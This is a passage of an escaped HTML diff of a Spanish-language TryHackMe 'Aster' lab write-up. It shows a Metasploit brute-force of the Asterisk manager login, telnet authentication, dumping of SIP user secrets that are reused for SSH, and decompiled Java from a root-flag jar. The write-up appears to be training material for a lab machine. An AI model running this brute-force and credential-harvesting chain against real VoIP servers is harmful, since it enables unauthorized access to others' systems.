+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;msf5 &amp;gt; use auxiliary/voip/asterisk_login
+msf5 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;voip/asterisk_login&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; USERNAME admin
+&lt;span class=&#34;nv&#34;&gt;USERNAME&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; admin
+msf5 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;voip/asterisk_login&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; rhosts aster.thm
+&lt;span class=&#34;nv&#34;&gt;rhosts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; aster.thm
+msf5 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;voip/asterisk_login&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; show options 
+
+Module options &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;auxiliary/voip/asterisk_login&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
+
+   Name              Current Setting                                                    Required  Description
+   ----              ---------------                                                    --------  -----------
+   BLANK_PASSWORDS   &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;                                                              no        Try blank passwords &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all users
+   BRUTEFORCE_SPEED  &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;                                                                  yes       How fast to bruteforce, from &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; to &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;
+   DB_ALL_CREDS      &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;                                                              no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;                                                              no        Add all passwords in the current database to the list
+   DB_ALL_USERS      &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;                                                              no        Add all users in the current database to the list
+   PASSWORD                                                                             no        A specific password to authenticate with
+   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  no        The file that contains a list of probable passwords.
+   RHOSTS            aster.thm                                                          yes       The target host&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, range CIDR identifier, or hosts file with syntax &lt;span class=&#34;s1&#34;&gt;&amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
+   RPORT             &lt;span class=&#34;m&#34;&gt;5038&lt;/span&gt;                                                               yes       The target port &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;TCP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+   STOP_ON_SUCCESS   &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;                                                              yes       Stop guessing when a credential works &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; a host
+   THREADS           &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;                                                                  yes       The number of concurrent threads &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;max one per host&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+   USERNAME          admin                                                              no        A specific username to authenticate as
+   USERPASS_FILE                                                                        no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      &lt;span class=&#34;nb&#34;&gt;false&lt;/span&gt;                                                              no        Try the username as the password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all users
+   USER_FILE         /usr/share/metasploit-framework/data/wordlists/unix_users.txt      no        The file that contains a list of probable users accounts.
+   VERBOSE           &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;                                                               yes       Whether to print output &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all attempts
+
+msf5 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;voip/asterisk_login&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; stop_on_success &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;stop_on_success&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
+msf5 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;voip/asterisk_login&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; 
+msf5 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;voip/asterisk_login&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; run
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.160.101:5038    - Initializing module...
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.160.101:5038    - 10.10.160.101:5038 - Trying user:&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt; with password:&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.160.101:5038    - 10.10.160.101:5038 - Trying user:&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt; with password:&lt;span class=&#34;s1&#34;&gt;&amp;#39;123456&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.160.101:5038    - 10.10.160.101:5038 - Trying user:&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt; with password:&lt;span class=&#34;s1&#34;&gt;&amp;#39;12345&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.160.101:5038    - 10.10.160.101:5038 - Trying user:&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt; with password:&lt;span class=&#34;s1&#34;&gt;&amp;#39;123456789&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.160.101:5038    - 10.10.160.101:5038 - Trying user:&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt; with password:&lt;span class=&#34;s1&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.160.101:5038    - 10.10.160.101:5038 - Trying user:&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt; with password:&lt;span class=&#34;s1&#34;&gt;&amp;#39;iloveyou&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.160.101:5038    - 10.10.160.101:5038 - Trying user:&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt; with password:&lt;span class=&#34;s1&#34;&gt;&amp;#39;princess&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.160.101:5038    - 10.10.160.101:5038 - Trying user:&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt; with password:&lt;span class=&#34;s1&#34;&gt;&amp;#39;1234567&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.160.101:5038    - 10.10.160.101:5038 - Trying user:&lt;span class=&#34;s1&#34;&gt;&amp;#39;admin&amp;#39;&lt;/span&gt; with password:&lt;span class=&#34;s1&#34;&gt;&amp;#39;12345678&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.160.101:5038    - User: &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt; using pass: &lt;span class=&#34;s2&#34;&gt;&amp;#34;[... REDACTED ...]&amp;#34;&lt;/span&gt; - can login on 10.10.160.101:5038!
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 10.10.160.101:5038    - No active DB -- Credential data will not be saved!
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; aster.thm:5038        - Scanned &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; of &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100% &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Auxiliary module execution completed
+msf5 auxiliary&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;voip/asterisk_login&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Nos conectamos a este servicio utilizando &lt;code&gt;telnet&lt;/code&gt; pasando las credenciales para autenticarnos:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/aster$ telnet aster.thm &lt;span class=&#34;m&#34;&gt;5038&lt;/span&gt;
+Trying 10.10.160.101...
+Connected to aster.thm.
+Escape character is &lt;span class=&#34;s1&#34;&gt;&amp;#39;^]&amp;#39;&lt;/span&gt;.
+Asterisk Call Manager/5.0.2
+Action: Login
+Username: admin
+Secret: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+
+Response: Success
+Message: Authentication accepted
+
+Event: FullyBooted
+Privilege: system,all
+Uptime: &lt;span class=&#34;m&#34;&gt;5368&lt;/span&gt;
+LastReload: &lt;span class=&#34;m&#34;&gt;5368&lt;/span&gt;
+Status: Fully Booted
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;harry---user&#34;&gt;HARRY - USER&lt;/h2&gt;
+&lt;p&gt;Enumeramos informacion SIP el cual contiene usuarios, &amp;ldquo;contraseñas&amp;rdquo; (secrets) y extensiones. Vemos que tenemos la &amp;ldquo;contraseña&amp;rdquo; del usuario harry, utilizamos esta en el servicio SSH y logramos obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Action: &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt;
+Command:  sip show users
+
+Response: Success
+Message: Command output follows
+Output: Username                   Secret           Accountcode      Def.Context      ACL  Forcerport
+Output: &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt;                        &lt;span class=&#34;m&#34;&gt;100&lt;/span&gt;                               &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;             No   No        
+Output: &lt;span class=&#34;m&#34;&gt;101&lt;/span&gt;                        &lt;span class=&#34;m&#34;&gt;101&lt;/span&gt;                               &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;             No   No        
+Output: harry                      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;                &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;             No   No        
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/aster/Screenshot_20200925_180452.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;root-flag&#34;&gt;ROOT FLAG&lt;/h2&gt;
+&lt;p&gt;Dentro de la carpeta de &lt;code&gt;harry&lt;/code&gt; encontramos el archivo &lt;strong&gt;Example_Root.jar&lt;/strong&gt; el cual decompilamos utilizando &lt;a href=&#34;http://www.javadecompilers.com/&#34;&gt;&lt;strong&gt;JavaDecompilers&lt;/strong&gt;&lt;/a&gt; y encontramos que el codigo valida que el archivo &lt;code&gt;/tmp/flag.dat&lt;/code&gt; existe, en tal caso escribe dentro de del archivo &lt;code&gt;/home/harry/root.txt&lt;/code&gt; la cadena &lt;code&gt;my secret &amp;lt;3 baby&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.IOException&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.FileWriter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;java.io.File&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;// 
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// Decompiled by Procyon v0.5.36
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Example_Root&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;isFileExists&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;File&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;isFile&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+    
+    &lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;File&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;File&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/tmp/flag.dat&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;isFileExists&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+                &lt;span class=&#34;kd&#34;&gt;final&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FileWriter&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fileWriter&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;FileWriter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/home/harry/root.txt&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+                &lt;span class=&#34;n&#34;&gt;fileWriter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;my secret &amp;lt;3 baby&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+                &lt;span class=&#34;n&#34;&gt;fileWriter&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;close&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+                &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Successfully wrote to the file.&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+            &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+        &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IOException&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+            &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;An error occurred.&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
+            &lt;span class=&#34;n&#34;&gt;ex&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
